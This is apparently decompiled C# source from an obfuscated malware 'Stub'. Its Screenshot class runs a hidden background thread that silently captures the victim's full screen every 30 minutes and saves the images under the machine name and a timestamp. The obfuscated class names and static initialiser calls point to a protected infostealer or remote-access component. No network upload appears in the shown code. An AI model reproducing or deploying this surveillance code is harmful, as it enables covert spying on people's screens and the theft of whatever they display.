using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000A6 RID: 166
	internal sealed class Screenshot
	{
		// Token: 0x0600024F RID: 591 RVA: 0x00017248 File Offset: 0x00015448
		public void Start()
		{
			if (!this._isRunning)
			{
				this._isRunning = true;
				this._screenshotThread = new Thread(new ThreadStart(this.ScreenshotLoop))
				{
					IsBackground = true,
					Name = "ScreenshotThread"
				};
				this._screenshotThread.Start();
			}
		}

		// Token: 0x06000250 RID: 592 RVA: 0x00003EDB File Offset: 0x000020DB
		public void Stop()
		{
			this._isRunning = false;
			Thread screenshotThread = this._screenshotThread;
			if (screenshotThread != null)
			{
				screenshotThread.Join(1000);
			}
		}

		// Token: 0x06000251 RID: 593 RVA: 0x00017298 File Offset: 0x00015498
		private void ScreenshotLoop()
		{
			try
			{
				while (this._isRunning)
				{
					this.CaptureScreenshot();
					int num = 0;
					while (num < this._intervalMinutes * 60 && this._isRunning)
					{
						Thread.Sleep(1000);
						num++;
					}
				}
			}
			catch (ThreadAbortException)
			{
			}
			catch (Exception ex)
			{
				Console.WriteLine("Screenshot thread error: " + ex.Message);
			}
		}

		// Token: 0x06000252 RID: 594 RVA: 0x00017320 File Offset: 0x00015520
		private void CaptureScreenshot()
		{
			try
			{
				Rectangle bounds = Screen.PrimaryScreen.Bounds;
				using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
				{
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
					}
					string text = this.GenerateFileName();
					string text2 = Path.Combine(Paths.InitWorkDir(), text);
					Directory.CreateDirectory(Path.GetDirectoryName(text2));
					bitmap.Save(text2, ImageFormat.Png);
					Logging.Log("Screenshot saved to: " + text2, true);
				}
			}
			catch (Exception ex)
			{
				Logging.Log("Screenshot capture error: " + ex.Message, true);
			}
		}

		// Token: 0x06000253 RID: 595 RVA: 0x0001740C File Offset: 0x0001560C
		private string GenerateFileName()
		{
			string machineName = Environment.MachineName;
			string text = DateTime.Now.ToString("yyyyMMdd_HHmmss");
			return machineName + "_" + text + ".png";
		}

		// Token: 0x06000254 RID: 596 RVA: 0x00003EFB File Offset: 0x000020FB
		public Screenshot()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			this._intervalMinutes = 30;
			base..ctor();
		}

		// Token: 0x06000255 RID: 597 RVA: 0x000038AD File Offset: 0x00001AAD
		static Screenshot()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}

		// Token: 0x0400050C RID: 1292
		private Thread _screenshotThread;

		// Token: 0x0400050D RID: 1293
		private bool _isRunning;

		// Token: 0x0400050E RID: 1294
		private readonly int _intervalMinutes;

		// Token: 0x020000A7 RID: 167
		private static class NativeMethods
		{
			// Token: 0x06000256 RID: 598
			[DllImport("user32.dll")]
			public static extern IntPtr GetForegroundWindow();

			// Token: 0x06000257 RID: 599
			[DllImport("user32.dll")]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool GetWindowRect(IntPtr hWnd, out Screenshot.NativeMethods.RECT lpRect);

			// Token: 0x06000258 RID: 600
			[DllImport("user32.dll")]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool PrintWindow(IntPtr hWnd, IntPtr hdcBlt, uint nFlags);

			// Token: 0x06000259 RID: 601 RVA: 0x000038AD File Offset: 0x00001AAD
			static NativeMethods()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x020000A8 RID: 168
			public struct RECT
			{
				// Token: 0x0400050F RID: 1295
				public int Left;

				// Token: 0x04000510 RID: 1296
				public int Top;

				// Token: 0x04000511 RID: 1297
				public int Right;

				// Token: 0x04000512 RID: 1298
				public int Bottom;
			}
		}
	}
}
